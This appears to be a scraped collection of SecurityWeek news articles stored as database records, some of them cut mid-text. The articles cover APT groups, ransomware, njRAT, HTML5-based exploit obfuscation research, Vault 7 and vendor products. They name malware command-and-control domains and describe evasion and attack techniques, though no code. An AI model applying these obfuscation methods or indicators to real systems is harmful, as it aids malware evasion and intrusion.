Tripwire, told SecurityWeek.  \"Many devices that use embedded Linux including routers and other devices may also be susceptible,\" Westin said. \"Attackers who exploit the vulnerability can monitor all data passing between a service and client, or decrypt historical encrypted data that has been collected. Many modern operating systems use vulnerable versions of Open SSL including  Debian Wheezy, Ubuntu 12.04.4 LTS, CentOS 6.5, Fedora 18, OpenBSD 5.3, FreeBSD 8.4, NetBSD 5.0.2 and OpenSUSE 12.2.” *Additional reporting by Mike Lennon " }
{ "_id" : { "$oid" : "5b27c4006cefc41c844ab269" }, "Category" : "Malware", "Title" : "Fighting Cyber Security FUD and Hype", "Address" : "https://www.securityweek.com/fighting-cyber-security-fud-and-hype", "Date" : "March 08, 2017", "Article" : " Dr. Ian Levy is technical director at the UK’s National Cyber Security Center (NCSC), which is part of GCHQ. It is fair to say that the NCSC will play a major part in defining and delivering the UK government’s cyber security policy over the next few years. In October 2016, Ian Levy reportedly made an unusual comment at the Wired Security conference in London. He said, “If you’re told that cyber security attacks are purported by winged ninja cyber monkeys who sit in a foreign country who can compromise your machine just by thinking about it you’re going to have a fear response. And that’s where we are today. The security companies are incentivized to make it sound as scary as possible because they want you to buy their magic amulets.” This was not a one-off sentiment voiced on-the-fly. He repeated it in February 2017: “We are allowing massively incentivized companies to define the public perception of the problem. If you call it an advanced persistent threat, you end up with a narrative that basically says ‘you lot are too stupid to understand this and only I can possibly help you – buy my magic amulet and you’ll be fine.’ It’s medieval witchcraft, it’s genuinely medieval witchcraft.” The security industry stands accused by the UK’s leading cyber security agency of over-hyping the cyber security threat to sell under-achieving products. It does this in two stages: firstly by defining the threat (by manipulating the media); and secondly by positioning its own product as the sole effective cure (by manipulating the buyer). The vendor/media relationship is a complex symbiosis. In the age of free news, each needs the other ― but there are well-known, if unspecified, rules. The primary rule is that the media must appear to be entirely independent of vendor influence, even when largely funded by vendor advertising. The vendor industry is forced to manipulate the media subliminally ― and different parts of the media accept this subliminal manipulation to differing degrees. Historically, the vendor’s primary tool has been the ‘press release’; but this is now supplemented by the vendor blog. The former is used to frame the company and its product; while the latter is used to frame the threat. The ultimate aim is to define the vendor as the sole cure for a dire threat; and to get the media to describe both in the vendor’s terms. The serious media will genuinely seek the underlying truth in all it receives. But journalists have their own pressures: the need to write compelling copy that will attract the largest possible readership, and to do so repeatedly to very tight deadlines. The first requirement (compelling copy) leads to the simple acceptance of new buzz words framed by the vendor to define a major new threat that it discovered, and by implication is best positioned to counter. It only takes a few major publications to use the term for it to rapidly become part of the security lexicon. Examples include kill chain, cyberwar, cyber pearl harbor, ‘perfect storm threatening Europe’, cyber 9/11 and many more. Ian Levy singles out the use/misuse of ‘advanced persistent threat’ to describe everything. “He pointed out that a UK telco [TalkTalk] had recently been taken offline using a SQL injection flaw that was older than the hacker alleged to have used it. That’s not advanced by any stretch of the imagination, he said.” (TalkTalk originally described the attack as a ‘significant and sustained’ cyber assault.) The second requirement (tight deadlines) is probably the primary cause of what is now known as ‘fake news’. For the most part, this is not a conspiracy to spread false rumors, but a failure to take sufficient time to check facts rather than simply trust sources. Fake news is not new — it has existed for as long as there have been reporters. Examples include CNN’s 1999 report that Kevin Mitnick “hacked into the North American Defense Command (NORAD), a feat that inspired the 1983 film ‘War Games’.” He didn’t do that. And the late 2016 Washington Post headline, “Russian hackers penetrated U.S. electricity grid through a utility in Vermont, U.S. officials say.” That didn’t happen. If Levy is correct, security vendors have been remarkably successful in subtly manipulating the media to frame the security threat in its own terms: that is, “cyber security attacks are purported by winged ninja cyber monkeys who sit in a foreign country who can compromise your machine just by thinking about it…” But he goes on to imply that the purpose of this manipulation is to make it easier to sell “magic amulets”. This last part requires manipulating the buyers into believing in the amulets. It is easy to forget that vendors are businesses, and their primary purpose is to make a profit. “I used to work selling security software,” comments Drew Koenig, now security solutions architect with Magenic. “The primary goal is not to solve the security problems, but sell you a product that you think can solve your security problems.” It is the methods used to sell the product regardless of effectiveness that worry some buyers; and the ability to see through these methods only comes with experience. Martin Zinaich, information security officer with the City of Tampa, has found salesmen will not necessarily take his ‘no’ for an answer. “I actually find vendors, when I express my appreciation of their product but do not see a true business fit, will start calling my younger staff. They know the shiny stuff can win a sale.” One vendor told him to use FUD (fear, uncertainty and doubt) to get budget to buy product. It didn’t work: “I never have and never will. The reality is the business relies on its professionals to act as such. If there is a real risk, we need to attack it. If there is perceived risk, we need to evaluate it.” A second problem is that salesmen do not necessarily understand either the technicalities of the product they must sell, or the specific demands of the security market ― and resort to their own version of FUD or fibs to make a sale. Malware researcher Rob Slade gave an example. At a vendor presentation, he was told this great new product will automatically make your products more secure. He asked if there was any assurance requirement that would mandate every developer use the product in a secure fashion. “The salesman gave a long-winded response,” said Slade, “that said you could use the product in a secure way, but, actually, it didn't require you to.  In other words, he gave a verbose answer that boiled down to ‘no’. I strongly suspect that the presenter didn't know he was lying to me.  He probably didn't even know what an assurance requirement was.” Surprisingly, the size of security product marketing budgets is also seen as an issue. “Vendor marketing budgets are a massive problem,” says security author Raef Meeuwisse; “especially as the largest budgets are often backing the most out of date and ineffective security technologies.  It often feels like the larger the ads, the less the vendor has to sell.” He believes that this has a direct effect on the size of the security market, because it “helps us buy security brands that have been around for a while rather than security solutions that often work considerably better.” The whole issue, he suggests, is then made worse by “commercial research companies whose business model requires that they only actively promote the companies paying in the most research money.” Ilia Kolochenko, CEO of High Tech Bridge, points out that it isn’t just the budgets of the big firms that causes problems. “We should keep in mind that numerous VCs that appeared on the bubbling market of venture capital during the last few years are also responsible for hype and FUD in cyber security.” Venture capital makes its money by buying low and selling high. It gambles that a new small company will become a big powerful company through increased sales before it cashes in on its investment. In short, venture capital is motivated by increasing sales rather than improving product. “Many of them,” explains Kolochenko, “put pressure on the company to increase sales by any means, selling to everyone, without really thinking if the client will get any benefit from their technology. This is why today many startups are trapped by easy-cash distributed by VCs, and now must spend all their time and other resources on aggressive sales rather than on technology. Entrepreneurs should remember that there is no free cash.” But it’s not a new problem, and it doesn’t just apply to cyber security. “There’s a degree of sensationalism that product marketers have always applied, not just now,” comments Bill Burns, chief trust officer and cloud business transformation at Informatica. “They’re always looking for ‘an edge’ to capture the market’s attention.” “It is the business, guided by our experience and input, which needs to make the final decision,” says Zinaich. “The fact is, more squirrels have taken out power around the globe than any hacker has to date. It is not even close. Yet, the fragile ‘House of Internet Things’ we are rapidly building is full of risk. That risk has to be managed in the light of reality, not by carnival barkers.” There is an acceptance among security leaders that security vendors will hype the products and FUD the threat; and that it is down to the professionals’ own knowledge and experience to get to the right product for the right price for their own environment. “I've found the best approach is to leverage proof-of-concepts on every solution we are considering,” comments John Masserini, CISO at MIAX Options. “Not only does it vet the hype from the reality, but it also gives you a deep understanding of the operational impact the solution will have on your specific infrastructure.  This is an often-overlooked aspect of many security solution providers and could be far more challenging than the risk you're trying to mitigate.  Make them prove their functionality in your specific environment before ever signing a check.\" Meeuwisse takes a similar view. “My main advice is this: security technology is moving so fast, don’t buy anything on an uncancellable multi-year deal.  You never know when it will start to become an inferior or outdated product or service.” Steve Lentz, chief security officer at Samsung Research America goes further ― he almost makes it personal. He doesn’t want a product that does what it says, he wants one that does more. “When I can get a vendor where I can trust that they will always do more, that is a big plus. This also includes that their support is top notch; and they better give me their best price the first time. If I have to keep haggling for a lower/best price they are out. If I have to send an email to their VP of Support and Sales, saying ‘your support sucks!’, they are out. If the vendor does what he says and more, and we prove that by first POCing and then purchasing, they usually stay in our security environment. I will renew as long as they keep this up.” The best way to combat vendor hype and FUD, says Koenig, “is to know what your security problems are before you look at vendors to solve them. Only a business knows what problems you have ― a guy in a booth or cold calling you shouldn’t tell you what problems they think you have.” When you fully understand the problems you have, he continues, “then go research the vendors yourself, hit the forums, ask your peers before you pick up the phone, talk to everyone but the vendor before you talk to the vendor. When it comes time to bring the vendor in always have the vendor prove it. Make them show the tools solving your problems, not a vendor made canned demo that will work 100% of the time showing you the buzzwords in action. Whatever you decide you will have to deal with it long after the sales team moves on. If you bring something in that doesn’t solve your problems, the vendor won’t be held accountable.” ‘Try before you buy’ is the repeated recommendation. Bill Burns thinks this is a new and growing option that may eventually solve the hype and FUD problem. “With the advent of mobile, SaaS and cloud computing, companies can now offer ‘trial versions’ of their software on the same infrastructure and offer the same user experience as the ‘real product’. Vendors can now show off their products ― warts and all ― directly to their target customers with the obligation to prove value in their product. The time between ‘awareness of an unmet need’ and ‘testing a solution’ is growing smaller quickly; good marketers know that relying on ‘hype’ will generate a negative reaction even faster than before.” There is no ultimate solution. Salesmen will continue to sell the products they represent rather than the correct solutions. Publications will continue to seek readers by making their news stories as ‘interesting’ as possible. The combination will always drift towards Ian Levy’s winged ninja cyber monkeys; but if Bill Burns is correct, the new Information Age may make it a self-correcting issue through the democratization of information. The new element is the citizen journalist ― the independent blogger who does not hesitate to correct the professional journalist who makes a mistake, nor criticize a product that is over-hyped or inadequate. Independent blogs will keep both publications and vendors honest. David Harley is both a security researcher and a prolific blogger. “There's no doubt that emotive language relating to warfare and/or epidemiology has long been a staple of security-related marketing (and journalism!). I can't say I like it – much of my career in security has been devoted to damping down the fires of hyperbole and advocating less drama and more precision,” he says. “But I'm most concerned by the misuse of language in ways that are actually deceptive rather than everyday sloppiness. It annoys me (quite disproportionately) when a system is described as 'infected' when 'compromised [by some form of Trojan]' would be more accurate; or when people use 'virus' as a synonym for 'malware'. However, I regard it as frankly deceptive when people evade the distinction between 'successful attacks' and 'attempted attacks' because saying 'ten million systems were attacked' is more dramatic and makes a marketing point more effectively than adding that '0.001% of attacks were actually successful'... Over time, bloggers like Harley could disarm, if not remove, the winged cyber ninja monkeys by keeping journalists honest and vendors truthful. " }

APT3 is believed to be behind 'Operation Clandestine Fox', a campaign first disclosed in April when the group began using a zero-day in Internet Explorer in targeted attacks. In May, the attackers began specifically targeting Windows XP machines running Internet Explorer 8. The group has also been seen using social networks to fool targets into installing malware.   \"APT3…the actors responsible for Operation Clandestine Fox has quietly continued to send waves of spearphishing messages over the past few months,\" FireEye researchers blogged. \"This actor initiated their most recent campaign on November 19, 2014 targeting multiple organizations. The attacker leveraged multiple exploits, targeting both CVE-2014-6332 and CVE-2014-4113. CVE-2014-6332 was disclosed publicly on 2014-11-11 and is a Windows OLE Automation Array Remote Code Execution vulnerability. CVE-2014-4113 is a privilege escalation vulnerability that was disclosed publicly on 2014-10-14.\"   \"The use of CVE-2014-6332 is notable, as it demonstrates that multiple classes of actors, both criminal and APT alike, have now incorporated this exploit into their toolkits,\" the researchers continued. \"Further, the use of both of these two known vulnerabilities in tandem is notable for APT3. This actor is historically known for leveraging zero-day vulnerabilities in widespread but infrequent phishing campaigns. The use of known exploits and more frequent attacks may indicate both a shift in strategy and operational tempo for this group.\"   CVE-2014-6332 was fixed earlier this month during Patch Tuesday. The bug garnered significant attention because it had exploitable for nearly two decades. The vulnerability affected all versions of Windows from Windows 95 on, and has been remotely exploitable since Internet Explorer 3.0. CVE-2014-4113 meanwhile exists when the Windows kernel-mode driver improperly handles objects in memory. An attacker who exploited it could potentially run arbitrary code in kernel mode.    \"Although APT3 is well known for employing zero-day exploits in their attacks, recent activity has demonstrated that they will also attack targets with known exploits or social engineering,\" the FireEye researchers wrote. \"Since Operation Clandestine Fox, we have observed this actor execute multiple attacks that did not rely on zero-day exploits. The combination of this sustained operational tempo and lack of zero-day exploits may indicate that this group has changed strategy and has decided to attack more frequently and does not have steady access to zero-day exploit code.\" \"No matter the strategy, this actor has shown an ability to operate successfully,\" the researchers added.

Researchers from the University of Salerno and the Sapienza University of Rome in Italy have used three different techniques to obfuscate exploits like the ones usually leveraged in drive-by download attacks. Based on their experiments, the experts have determined that functionality provided by HTML5 can be highly efficient for malware obfuscation. Drive-by download attacks usually involve a compromised or malicious website that is set up to host exploits for unpatched vulnerabilities affecting web browsers and browser components such as Adobe Reader, Flash Player, Java and Microsoft Silverlight. The website is able to push malware onto victims’ systems by exploiting these security holes. In most of today’s attacks, malicious actors use exploit kits to package exploits for several vulnerabilities on a single page. It’s not uncommon for cybercriminals to obfuscate their exploits, but modern security solutions are usually capable of detecting these threats. However, according to researchers, attackers could use some HTML5 features to hide the exploits served in drive-by download attacks in an effort to evade static and dynamic detection systems. HTML5, for which the final version was published in October 2014, specifies a series of scripting application programming interfaces (APIs) that can be used with JavaScript. Experts say some of these APIs can be used to deliver and assemble the exploit in the web browser without being detected. The first technique has been dubbed by researchers “delegated preparation.” The method involves delegating the preparation of the malware to system APIs. The second method, “distributed preparation,” relies on distributing the preparation of the code over concurrent and independent processes running within the browser. The third method, “user-driven preparation,” involves triggering the code preparation based on the user’s actions on the malicious webpage or website. Researchers have taken four old exploits targeting Internet Explorer and Firefox and tested their detection rates using VirusTotal for static analysis and Wepawet for dynamic analysis. When tested without any HTML5 obfuscation, researchers obtained fairly high detection rates for each of the threats. However, the test threats were not detected by the malware analysis tools when the proposed obfuscation techniques were used. The researchers conducted these initial experiments between February and April 2013. Since security solutions have evolved a great deal over the past two years, the experts have repeated their experiments in July 2015, but VirusTotal detection rates remain low. Umberto Ferraro Petrillo, one of the authors of the research paper, told SecurityWeek that VirusTotal detection rates for the same set of malware used in the initial experiments is currently 1/55, 0/55, 1/55 and 6/55. Antivirus vendors often argue that VirusTotal results are not very relevant because the actual product is designed to detect threats based on more than just signatures. However, Petrillo says they have also conducted tests on actual desktop machines running two of the top antivirus solutions and the results are in line with those reported by VirusTotal. “The obfuscation techniques we used are still pretty robust (consider that the unobfuscated versions of the malware we used are detectable by most of the systems used by Virustotal),” Petrillo told SecurityWeek. “In addition, there are margins for an even more aggressive implementation of our obfuscation techniques that should be able to make our samples harder to be detected.” The paper published by researchers, titled “Using HTML5 to Prevent Detection of Drive-by-Download Web Malware,” contains recommendations regarding some of the steps that can be taken in order to counter these obfuscation techniques.

The group, known as Dragonfly, Crouching Yeti and Energetic Bear, has been active since at least 2010, but its activities were first detailed by security firms in 2014. Many of the threat actor’s attacks have focused on the energy sector in the United States and Europe. Symantec says it has been monitoring a new campaign, which it has dubbed “Dragonfly 2.0,” since late 2015. The company has spotted victims of this operation in the United States, Switzerland and Turkey. Symantec first warned about Dragonfly’s potential power grid sabotage capabilities in 2014. However, there has been no evidence that any of the group’s attacks resulted in power disruptions. The company now claims to have found evidence that may suggest the attackers have actually gained access to computers linked to operational systems. The FBI and the DHS recently issued a joint report to warn manufacturing plants, nuclear power stations and other energy facilities in the U.S. of attacks that may have been launched by Dragonfly. However, the U.S. Department of Energy said only administrative and business networks were impacted, not systems controlling the energy infrastructure. Symantec pointed out that Dragonfly’s initial campaigns appeared to focus on breaching the targeted organizations’ networks. However, in more recent attacks, the hackers seemed interested in learning how energy facilities operate and gaining access to operational systems. Experts warned that access to operational systems could be used in the future for more disruptive purposes, including to cause power outages. However, the most “concerning evidence” presented by the security firm involves screen captures taken by the group’s malware. Some screen capture files analyzed by researchers had names containing the location and a description of the infected machine and the targeted organization’s name. Some of the machine descriptions included the string “cntrl,” which may mean that the compromised machine had access to control systems. Experts previously linked Dragonfly to Russia. Symantec has not made any clear statements regarding the threat actor’s location, but it did say that some of the malware code was in Russian. However, researchers also reported finding strings written in French, which suggests that the attackers may be trying to throw investigators off track. Symantec has linked the Dragonfly 2.0 attacks to earlier Dragonfly campaigns based on the use of watering holes, phishing emails, trojanized applications, and the same malware families, including the Heriplor backdoor that appears to be exclusively used by this group.

According to Symantec's Security Response Team, the malware's authors may have raked more than $34,000 since it appeared on the scene in late February. The estimate is based on the Bitcoin addresses provided by the malware authors for payment of the ransom and an examination of the publicly-available Bitcoin blockchain information.  But despite its success, the malware has a flaw that may provide victims the key to beating the attackers at their own game. \"As advertised by the malware authors in the ransom demand, the files were encrypted with an RSA-2048 key generated on the victim’s computer,\" according to Symantec's Security Response Team. \"This was done using Microsoft’s own cryptographic infrastructure and Windows APIs to perform the key generation before sending it back in plain text to the attacker’s server. However, using this method means that the decryption key the attackers are holding for ransom, actually still remains on the infected computer after transmission to the attackers server.\" When using Microsoft’s cryptography infrastructure, the private keys are stored in the following location: %UserProfile%\\Application Data\\Microsoft\\Crypto\\RSA. \"Due to the attackers' poor implementation of the cryptographic functionality they have, quite literally, left their hostages a key to escape,\" Symantec noted.  The malware is being spammed out and distributed via malicious PDF files. The majority of the infections Symantec has detected are in the United States, with the U.K., Canada, Australia and a number of other countries also being sites of infections. When first executed, CryptoDefense attempts to communicate with one of the following: machetesraka.com, markizasamvel.com, armianazerbaijan.com and allseasonsnursery.com. The initial communication contains a profile of the infected machine. Once a reply is received from the remote location, the malware initiates the encryption and transmits the private key back to the server. After the remote server confirms the recipient of the private decryption key, a screenshot of the compromised desktop is uploaded to the remote location, according to Symantec. Once the files are encrypted, the malware creates ransom-demand files in every folder containing encrypted files. The malware authors are using the Tor network for payment of the ransom. \"If victims are not familiar with what the Tor network is, they even go as far as providing instructions on how to download a Tor-ready browser and enter the unique Tor payment Web page address,\" according to Symantec. \"The use of the Tor network conceals the website’s location and provides anonymity and resistance to take down efforts. Other similar threats, such as Cryptorbit (Trojan.Nymaim.B), have used this tactic in the past.\" Once the user opens the unique personal page provided in the ransom demand using the Tor Browser, they will be presented with a CAPTCHA page. If they fill out the CAPTCHA correctly, they will be sent to the payment page. The price of the ransom is $500 USD, which the hackers threaten to double if they are not paid within four days.   \"CryptoDefense, in essence, is a sophisticated hybrid design incorporating a number of effective techniques previously used by other ransomcrypt malware authors to extort money from victims,\" Symantec explained. \"These techniques include the use of Tor and Bitcoins for anonymity, public-key cryptography using strong RSA 2048 encryption in order to ensure files are held to ransom, and the use of pressure tactics such as threats of increased costs if the ransom is not paid within a short period of time. However, the malware author’s poor implementation of the cryptographic functionality has left their hostages with the key to their own escape.\" " }

The attack starts with a spear phishing email coming from a spoofed sec.gov email address, which carries a document apparently containing “important” information. Once the document is opened, a VBS script installs a new PowerShell backdoor dubbed POWERSOURCE. POWERSOURCE has also been used to download a second-stage PowerShell backdoor named TEXTMATE, which provides a reverse shell to the attacker. POWERSOURCE is an obfuscated and modified version of the publicly available DNS_TXT_Pwnage tool, while TEXTMATE is a fileless malware. Both rely on DNS TXT requests for command and control (C&C) communications. POWERSOURCE has also been spotted delivering Cobalt Strike’s Beacon post-exploitation tool, which had been used in previous FIN7 operations as well. FireEye noted that the domain serving the Beacon payload had also hosted a Carbanak backdoor sample compiled in February 2017. FIN7 has been known to rely heavily on Carbanak malware. FireEye has identified 11 targets in the financial services, transportation, education, retail, IT services, and electronics sectors. While the SEC-themed spear-phishing campaign focuses on organizations in the United States, experts believe it is possible that the cybercriminals have launched similar operations in other countries, leveraging the names of their respective regulators. The security firm said its products and services blocked these attacks in their early stages, which prevented researchers from determining what the attackers were after. “If the attackers are attempting to compromise persons involved in SEC filings due to their information access, they may ultimately be pursuing securities fraud or other investment abuse,” FireEye researchers said in a blog post. “Alternatively, if they are tailoring their social engineering to these individuals, but have other goals once they have established a foothold, they may intend to pursue one of many other fraud types.” In previous attacks, FIN7 used various point-of-sale (PoS) malware families to steal sensitive financial information from targeted organizations. The Carbanak malware used by the group is known for its role in campaigns that involved fraudulent bank transactions and ATM attacks. " }

Falcon Endpoint Protection Complete is a turnkey solution that combines Falcon Endpoint Protection technology with the experience and skills of the Falcon Endpoint Protection team. CrowdStrike says the new solution, which can be used by organizations of all sizes, unifies people, technology and processes to address every aspect of endpoint security, from deployment, configuration and maintenance to monitoring, alert handling and remediation. The new threat analysis subscription module added by CrowdStrike to its Falcon platform is called Falcon X and it’s designed to help analysts conduct comprehensive investigations in just seconds instead of hours or days, the endpoint security firm says. Falcon X combines malware search, malware sandboxing and intelligence to provide indicators of compromise (IOCs) for the threat being analyzed and all its known variants. The results are shared with other security products via an API, including firewalls, gateways and orchestration tools. Threat intelligence data associated with the analyzed attack is displayed alongside alerts to help analysts understand the risks and quickly take action. CrowdStrike also announced that its Falcon Insight endpoint detection and response (EDR) solution now includes two new features designed to provide incident responders immediate access to all systems across the distributed enterprise. The company says the new features, Real Time Response and Real Time Query, leverage the existing Falcon sensors, cloud and console without any impact on performance or infrastructure. “The Real Time Response feature adds powerful interactive capabilities, delivering instant visibility into the local file system, registry, network, and more. It also allows responders to close the door on threats by killing malicious processes and removing remaining traces left behind by the attacker,” CrowdStrike explained. “Real Time Query delivers the ultimate visibility and control to responders, empowering them through custom-tailored information collection and response actions.” " }

The update is for Windows, Mac and Linx users, and addresses a vulnerability that can be exploited by attackers to potentially execute code.  Adobe spokesperson Heather Edell said that last month, the company issued a \"proactive mitigation\" that was successful in blocking an attack against CVE-2014-8439, a vulnerability in the handling of a dereferenced memory pointer. Because there was a specific attack targeting the vulnerability however, the company added further mitigations in today's release, she said.   \"We discovered the vulnerability while analyzing a Flash exploit from an exploit kit called Angler,\" blogged Timo Hirvonen, senior researcher at F-Secure. \"We received the sample from Kafeine, a renowned exploit kit researcher. He asked us to identify the vulnerability which was successfully exploited with Flash Player 15.0.0.152 but not with 15.0.0.189. That would imply the vulnerability was something patched in APSB14-22. However, based on the information that we had received via Microsoft Active Protections Program the exploit didn’t match any of the vulnerabilities patched in APSB14-22 (CVE-2014-0558, CVE-2014-0564, or CVE-2014-0569).\"   \"We considered the possibility that maybe the latest patch prevented the exploit from working and the root cause of the vulnerability was still unfixed so we contacted the Adobe Product Security Incident Response Team,\" he continued. \"They confirmed our theory and released an out-of-band update to provide additional hardening against a vulnerability in the handling of a dereferenced memory pointer that could lead to code execution, CVE-2014-8439.\"   In October, Kafeine reported the Angler exploit kit was targeting the vulnerability, and the Astrum and Nuclear exploit kits soon followed suit, Hirvonen noted. Kafeine also reported last week that another Flash Player vulnerability, CVE-2014-8440, was being targeted by Angler as well.    \"Considering the exploit kit authors reverse engineered October’s Flash update in two days, installing the update immediately is paramount, whether you do it manually or automatically,\" he blogged.

It has only been publicly available since June of 2013, but it may have been developed and distributed privately as early as 2012, according to Symantec. In terms of capabilities, njRAT is similar to most other remote access tools (RATs). What distinguishes it is that it is developed and supported by Arabic speakers and has therefore become popular among attackers in the region, Symantec noted. According to Symantec, njRAT can download and execute additional malware, execute shell commands, read and write registry keys and capture screenshots. It can also log keystrokes and spy on webcams. It spreads using infected USB keys and networked drives. \"The main reason for njRAT’s popularity in the Middle East and North Africa is a large online community providing support in the form of instructions and tutorials for the malware’s development,\" according to Symantec's Security Response Team. \"The malware’s author also appears to hail from the region. njRAT appears to have been written by a Kuwait-based individual who uses the Twitter handle @njq8. The account has been used to provide updates on when new versions of the malware are available to download.\" The majority of the command-and-control server IP addresses were traced to ADSL lines, indicating that most of the attackers using the malware could be home users in the Middle East, according to the firm. So far, some 24,000 computers have been found to be infected worldwide, and 542 command-and-control server domain names have been discovered. Nearly 80 percent of the C&C servers were located in the Middle East and North Africa, including Saudi Arabia, Iraq and Egypt. Symantec has identified 487 groups of attackers using njRAT. The attacks appear to have a variety of motivations, from hacktivism to simple information theft. One such group is the S.K.Y.P.E/Tagged group, which has C&C servers hosted in Egypt and Algeria and uses a screensaver hosted on the file sharing site ge.tt to infect users. When victims download the compressed .rar file with the screensaver, they get an executable containing njRAT. \"The S.K.Y.P.E/Tagged group uses two C&C servers: njratmoony.no-ip.biz and njr.no-ip.biz,\" according to Symantec. 'The number of newly infected computers reporting to both servers spiked in October and November of 2012.\" The malware has also been spotted being used by pro-Syrian government attackers in cyber-attacks on the opposition. According to a report by the Electronic Frontier Foundation and the Citizen Lab, the malware exfiltrates data to a command-and-control server at hacker1987.zapto.org, which resolves to 46.213.0.220, which is also on the Syriatel Mobile network.   \"As large numbers of Middle Eastern attackers continue to use njRAT due to its accessibility, Symantec expects that they will try to find new ways of obfuscating the malware to evade detection by antivirus software,\" the Security Response Team continued. \"They are likely to continue to use njRAT since an Arabic speaking community and its Arabic author (continues) to provide support for the malware. The more advanced threat actors, such as hacker groups, may continue to use njRAT for targeted attacks in the short term.\" " }

The leak, dubbed “Vault 7,” apparently exposes the CIA’s vast hacking capabilities. WikiLeaks said the files come from the CIA’s Center for Cyber Intelligence (CCI) in Langley, Virginia, and they have been circulating among former U.S. government hackers and contractors. One of these individuals provided the data to the whistleblower organization, which has called it “the largest intelligence publication in history.” According to WikiLeaks, the files, dated between 2013 and 2016, include malware and exploits targeting the products of several major tech companies, including Apple, Google, Microsoft and Samsung. The leaked tools can allegedly be used to hack mobile devices, desktop computers, routers, smart TVs and other types of systems.  These pieces of software are said to have been developed by the CCI’s Engineering Development Group (EDG). WikiLeaks said the EDG develops, tests and provides support for backdoors, exploits, Trojans, viruses and other types of malware used by the CIA. In addition to hacking tools developed by its own people, the agency allegedly obtained tools from British intelligence agencies (GCHQ and MI5), the NSA, the FBI and cyber arms contractors. For instance, the agency is said to have collaborated with MI5 on the development of a tool designed for spying on people through Samsung smart TVs. The CIA allegedly has dozens of zero day exploits designed for targeting devices running Android, iOS, Windows, OS X and Linux. WikiLeaks claims some of these tools even allow the agency to bypass the encryption of secure messaging apps such as Signal, WhatsApp, and Telegram. However, this does not necessarily mean these applications have been compromised – an attacker who has root access to a mobile device can often access messages exchanged via secure IM apps without the need to break the encryption. WikiLeaks will not release the tools and exploits “until a consensus emerges on the technical and political nature of the CIA's program and how such 'weapons' should analyzed, disarmed and published.” The files also appear to show that the CIA has developed tools designed for targeting the control systems of modern vehicles, multi-platform malware, and threats that add themselves to CDs and DVDs in order to jump air gaps. Following the Edward Snowden leaks, the U.S. government has promised to disclose serious vulnerabilities that represent a high risk or affect a product that is widespread in critical infrastructure. If the files obtained by WikiLeaks are genuine, the CIA breached that commitment. " }

Wireless Application Protocol (WAP) billing provides a mechanism for users to acquire content online and have it charged directly to their mobile phone bill so that they don’t have to provide any payment card information. The method is similar to premium SMS services, but it does not involve sending SMS messages and instead users have to click on a button displayed on a website to approve charges. Android malware abusing WAP billing was spotted in the past years, including on Google Play, and it now appears to be making a comeback. Several of the top 20 most common trojans detected by Kaspersky products in the second quarter abused WAP billing. While a majority of the infections were in Russia and India, victims were also seen in many other countries. “We haven’t seen these types of Trojans for a while. The fact that they have become so popular lately might indicate that cybercriminals have started to use other verified techniques, such as WAP-billing, to exploit users,” said Roman Unuchek, security expert at Kaspersky Lab. “Moreover, a premium rate SMS Trojan is more difficult to create. It is also interesting that malware has targeted mainly Russia and India, which could be connected to the state of their internal, local telecoms markets.” The list of trojans that abuse WAP billing include Trojan-Clicker.AndroidOS.Ubsod, which infected nearly 8,000 devices in Russia and 81 other countries; Xafekopy, which infected more than 5,000 users in India and 47 other countries; Autosus, which infected roughly 1,400 devices in India, South Africa and Egypt; and Podec, which had last been seen in the second quarter of 2016. These pieces of malware have been used by several cybercrime groups, and while in some cases their development started in late 2016 or early 2017, their use increased significantly at the beginning of summer. The samples analyzed by Kaspersky disable the infected device’s WiFi and enable the mobile data connection, which is needed due to the fact that WAP billing only works through mobile Internet as the carrier needs to be able to identify the user making the online purchase. The trojans then use JavaScript code to automate certain actions, such as opening web pages and clicking on the buttons associated with WAP billing. By automating these tasks, no user interaction is required for the attack to work. The malware also deletes incoming SMS messages to avoid raising suspicion. Some samples also abuse Device Administrator rights on the infected Android device to make their removal more difficult. “We weren’t able to find a reason why so many cybercriminals decided to switch or to start attacking WAP-billing services at the same time,” Unuchek said. “WAP-billing services are not a new thing – in some countries they’ve existed for several years.” " }

Following the discovery of the Meltdown and Spectre vulnerabilities, Intel has promised to take steps to avoid these types of situations through protections built into CPUs, a dedicated bug bounty program, and industry collaboration. Intel recently detailed the protection mechanisms it plans on adding to its chips, and the company has now unveiled its Threat Detection Technology. This system uses silicon-level telemetry and functionality to help security products detect sophisticated cyber threats. One component of the Threat Detection Technology is called Accelerated Memory Scanning, which Microsoft will integrate into Windows Defender Advanced Threat Protection (ATP) later this month. The Accelerated Memory Scanning capability will allow Windows Defender and other security products to more efficiently scan the system memory for threats by using Intel’s integrated graphics processor. Using the GPU instead of the CPU will enable more frequent scanning, and will result in reduced impact on performance and power consumption, Intel said. Tests made by the company showed a drop in CPU usage from 20 percent to as little as 2 percent. On the other hand, using the GPU to conduct scans can have a negative performance impact on processes that require the graphics processor, Intel admitted during a call with reporters. However, the company says it’s working on figuring out how to optimize performance based on the CPU and GPU workloads. The second component of Intel Threat Detection Technology is called Advanced Platform Telemetry and it combines telemetry with machine learning algorithms to improve threat detection, reduce false positives, and minimize impact on performance. The Advanced Platform Telemetry capability will first be integrated into Cisco Tetration, a product that provides holistic workload protection for multicloud data centers. Intel has also unveiled Security Essentials, a framework that standardizes built-in security features in Intel chips, including Core, Xeon and Atom processors. “These capabilities are platform integrity technologies for secure boot, hardware protections (for data, keys and other digital assets), accelerated cryptography and trusted execution enclaves to protect applications at runtime,” explained Rick Echevarria, vice president and general manager of Intel Platforms Security Division. “This standard set of capabilities will accelerate trusted computing as customers build solutions rooted in hardware-based protections. Further, these capabilities, directly integrated into Intel silicon, are designed to improve the security posture of computing, lower the cost of deploying security solutions and minimize the impact of security on performance,” Echevarria added. As for the strategic collaboration with Purdue University, Intel announced a Design for Security Badge Program whose goal is to accelerate the development and availability of cybersecurity professionals.

